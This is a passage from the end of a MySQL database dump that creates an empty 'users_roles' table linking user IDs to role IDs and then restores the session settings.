DROP TABLE IF EXISTS `users_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users_roles` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `rol_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_users_permisos_users` (`user_id`),
  KEY `FK_users_permisos_roles` (`rol_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users_roles`
--

LOCK TABLES `users_roles` WRITE;
/*!40000 ALTER TABLE `users_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `users_roles` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-05-12 14:21:22
